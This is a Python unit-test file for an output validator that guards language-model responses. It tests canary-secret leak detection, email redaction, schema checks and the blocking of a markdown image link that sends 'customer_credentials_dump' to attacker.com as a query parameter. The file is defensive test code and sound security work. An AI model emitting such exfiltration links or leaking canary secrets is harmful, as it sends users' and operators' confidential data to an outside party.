"""Unit tests for OutputValidator: canary secret leak detection, markdown exfiltration, and schema enforcement."""

from pydantic import BaseModel

from shield.core.models import ActionDecision
from shield.guards.output_validator import OutputValidator


class SampleSummarySchema(BaseModel):
    summary: str
    item_count: int


def test_clean_output_passes():
    validator = OutputValidator()
    text = "The financial audit was completed with zero discrepancies found."
    result = validator.validate(text)

    assert result.passed is True
    assert result.decision == ActionDecision.ALLOW
    assert len(result.leaks_detected) == 0
    assert result.sanitized_output == text


def test_canary_secret_leak_detected_and_blocked():
    validator = OutputValidator()
    canary = "SUPER_SECRET_INTERNAL_CANARY_TOKEN_9981"
    response_text = f"Sure, here is the secret you requested: {canary}"

    result = validator.validate(response_text, canary_secrets={canary})

    assert result.passed is False
    assert result.decision == ActionDecision.BLOCK
    assert any("Canary secret detected" in leak for leak in result.leaks_detected)
    assert canary not in result.sanitized_output


def test_markdown_image_exfiltration_blocked():
    validator = OutputValidator()
    response_text = (
        "Here is the chart: ![chart](https://attacker.com/leak.png?data=customer_credentials_dump)"
    )
    result = validator.validate(response_text)

    assert result.passed is False
    assert result.decision == ActionDecision.BLOCK
    assert any("exfiltration" in leak.lower() for leak in result.leaks_detected)
    assert "https://attacker.com/leak.png" not in result.sanitized_output


def test_pii_scrubbed_in_output():
    validator = OutputValidator()
    response_text = "The account holder is John at user@securecorp.com."
    result = validator.validate(response_text)

    assert result.passed is True
    assert result.decision == ActionDecision.REDACT
    assert "[EMAIL_REDACTED]" in result.sanitized_output
    assert "user@securecorp.com" not in result.sanitized_output


def test_structured_schema_validation_passes():
    validator = OutputValidator()
    valid_json = '{"summary": "Quarterly earnings grew 12%", "item_count": 5}'
    result = validator.validate(valid_json, expected_schema=SampleSummarySchema)

    assert result.passed is True
    assert result.decision == ActionDecision.ALLOW


def test_structured_schema_validation_fails_on_broken_json():
    validator = OutputValidator()
    invalid_json = '{"summary": "Broken missing count"}'
    result = validator.validate(invalid_json, expected_schema=SampleSummarySchema)

    assert result.passed is False
    assert result.decision == ActionDecision.BLOCK
    assert "schema validation" in result.reason.lower()
